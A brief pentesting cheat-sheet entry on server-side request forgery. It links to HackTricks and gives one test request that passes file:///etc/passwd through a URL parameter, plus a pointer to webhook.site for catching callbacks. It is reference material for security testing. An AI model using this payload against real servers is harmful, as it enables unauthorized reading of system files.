## SSRF (server side request forgery)

https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### check if possible

check for common files:

```bash
http://HOST/getClientData.php?url=file:///etc/passwd
```

or use a tool like: http://webhook.site/